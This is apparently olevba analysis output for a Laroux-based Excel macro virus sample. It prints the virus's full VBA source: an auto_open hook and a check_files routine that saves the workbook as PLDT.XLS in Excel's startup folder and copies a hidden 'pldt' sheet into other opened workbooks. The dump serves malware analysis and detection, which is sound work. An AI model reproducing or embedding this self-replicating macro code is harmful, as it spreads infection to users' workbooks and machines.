olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Laroux-based-99a28b8088b5e5e939f25c9c7d60186fdc5ba2ee
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO pldt.bas 
in file: Virus.MSExcel.Laroux-based-99a28b8088b5e5e939f25c9c7d60186fdc5ba2ee - OLE stream: '_VBA_PROJECT_CUR/VBA/pldt'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 























Sub auto_open()
Attribute auto_open.VB_ProcData.VB_Invoke_Func = " \n14"
    application.OnSheetActivate = "check_files"
End Sub

Sub check_files()
Attribute check_files.VB_ProcData.VB_Invoke_Func = " \n14"
    c$ = application.StartupPath
    m$ = Dir(c$ & "\" & "PLDT.XLS")
    If m$ = "PLDT.XLS" Then p = 1 Else p = 0
    If ActiveWorkbook.Modules.Count > 0 Then w = 1 Else w = 0
    whichfile = p + w * 10
    
Select Case whichfile
    Case 10
    application.ScreenUpdating = False
    n4$ = ActiveWorkbook.Name
    Sheets("pldt").Visible = True
    Sheets("pldt").Select
  '  Sheets("pldt").Copy
  '  With ActiveWorkbook
  '      .Title = ""
  '      .Subject = ""
  '      .Author = ""
  '      .Keywords = ""
  '      .Comments = ""
  '  End With
    newname$ = ActiveWorkbook.Name
    c4$ = CurDir()
    ChDir application.StartupPath
    ActiveWindow.Visible = False
    Workbooks(newname$).SaveAs FileName:=application.StartupPath & "/" & "PLDT.XLS", FileFormat:=xlNormal _
        , password:="", WriteResPassword:="", ReadOnlyRecommended:= _
        False, CreateBackup:=False
    ChDir c4$
    Workbooks(n4$).Sheets("pldt").Visible = True
    application.OnSheetActivate = ""
    application.ScreenUpdating = True
    application.OnSheetActivate = "PLDT.XLS!check_files"
    Case 1
    application.ScreenUpdating = False
    n4$ = ActiveWorkbook.Name
    p4$ = ActiveWorkbook.path
    s$ = Workbooks(n4$).Sheets(1).Name
    If s$ <> "pldt" Then
        Workbooks("PLDT.XLS").Sheets("pldt").Copy before:=Workbooks(n4$).Sheets(1)
        Workbooks(n4$).Sheets("pldt").Visible = False
    Else
    End If
    application.OnSheetActivate = ""
    application.ScreenUpdating = True
    application.OnSheetActivate = "PLDT.XLS!check_files"
    Case Else
End Select
End Sub
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     12 BOUNDSHEET : Sheet Information - Visual Basic module, visible -  pld
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |auto_open           |Runs when the Excel Workbook is opened       |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

